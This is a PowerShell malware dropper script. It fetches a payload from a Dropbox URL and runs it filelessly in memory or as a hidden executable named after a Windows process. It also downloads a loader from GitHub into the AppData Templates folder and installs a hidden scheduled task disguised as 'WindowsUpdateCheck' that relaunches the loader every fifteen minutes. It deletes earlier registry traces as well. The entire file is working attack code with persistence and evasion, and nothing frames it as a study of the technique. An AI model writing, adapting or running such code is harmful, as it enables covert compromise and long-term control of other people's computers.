# ==========================================
# FINAL DEPLOY SCRIPT (C++ LOADER + COM)
# ==========================================

# --- CONFIGURATION ---
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
$LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Remove Old Traces) ---
try {
    # Remove old registry keys
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    
    # Stop old processes
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 2. EXECUTION (Run Payload Now) ---
function Run-Payload {
    Write-Host "Starting Payload..." -F Gray
    try {
        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
    } catch { return }

    # Attempt 1: Load directly into RAM (Fileless)
    try {
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        $assembly.EntryPoint.Invoke($null, $null)
        return
    } catch {}

    # Attempt 2: Drop to Disk (Hidden) and Run
    try {
        $path = "$env:APPDATA\Microsoft\Windows\Templates\WmiPrvSE.exe"
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden
    } catch {}
}

# --- 3. PERSISTENCE (Install C++ Loader via COM) ---
try {
    # A. Download the C++ Loader (Invisible EXE)
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile($LoaderUrl, $LoaderPath)
    } catch {}

    # B. Register Task via COM Object (Reliable/Infinite)
    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder("\")
    
    # Define Task
    $taskDef = $service.NewTask(0)
    $taskDef.RegistrationInfo.Description = "System Integrity Check"
    $taskDef.Settings.Enabled = $true
    $taskDef.Settings.Hidden = $true
    $taskDef.Settings.MultipleInstances = 2 # Parallel Execution
    $taskDef.Settings.DisallowStartIfOnBatteries = $false
    $taskDef.Settings.StopIfGoingOnBatteries = $false
    
    # Create Trigger (Logon + 15 Min Infinite Loop)
    $trigger = $taskDef.Triggers.Create(9) # 9 = LogonTrigger
    $trigger.Id = "LogonTrigger"
    $trigger.Enabled = $true
    $trigger.Repetition.Interval = "PT15M" # 15 Minutes
    # Note: We do NOT set Duration, so it defaults to Indefinite.
    
    # Create Action (Run the C++ Loader)
    $action = $taskDef.Actions.Create(0) # 0 = Execute
    $action.Path = $LoaderPath
    
    # Register Task
    # 6 = CreateOrUpdate, 4 = Run as Interactive User
    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "BUILTIN\Users", $null, 4) | Out-Null
    
    Write-Host "✅ C++ Persistence Installed (Infinite Loop)." -F Green

} catch {
    Write-Host "⚠️ Persistence Setup Failed: $($_.Exception.Message)" -F Red
}

# --- 4. START ---
Run-Payload
